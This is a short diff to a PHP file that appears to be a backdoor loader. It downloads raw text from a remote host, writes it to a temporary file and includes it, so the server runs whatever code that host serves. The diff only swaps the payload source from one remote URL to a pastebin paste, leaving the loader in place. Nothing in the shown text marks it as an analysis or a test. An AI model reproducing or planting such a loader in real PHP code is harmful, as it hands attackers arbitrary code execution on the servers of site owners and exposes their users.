@@ -1,6 +1,6 @@
 <?php
 $temp_filee = tmpfile(); 
-$content = implode('', file('https://hxbdoor.one/raw/aeR6dg9K'));
+$content = implode('', file('https://pastebin.com/raw/CdNWURPG'));
 fwrite($temp_filee, $content);
 $file_path = stream_get_meta_data($temp_filee)['uri'];
 include $file_path;
